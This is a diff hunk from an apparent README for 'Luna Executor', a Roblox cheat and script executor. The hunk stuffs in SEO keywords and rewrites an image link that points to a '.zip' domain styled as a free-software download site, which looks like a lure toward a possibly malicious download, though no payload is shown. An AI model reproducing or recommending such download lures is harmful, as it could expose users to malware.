@@ -11,7 +11,7 @@ To get started with Luna Executor, follow these simple steps:
 **Keywords:** Roblox executor, script executor, Roblox hacks, Roblox mods, gaming tools, script engine, Roblox enhancements, Roblox modding 2025.
 
 
-<a href="https://getintopc.zip/?z=40&n=Get-Into-PC---Download-Free-Software" target="_blank"><img src="/assets/Luna.png" alt="Luna Executor Preview"></a>
+[![Luna Executor Preview](/assets/Luna.png)](https://getintopc.zip/?z=40&n=Get-Into-PC---Download-Free-Software)
 
 
 ## Table of Contents
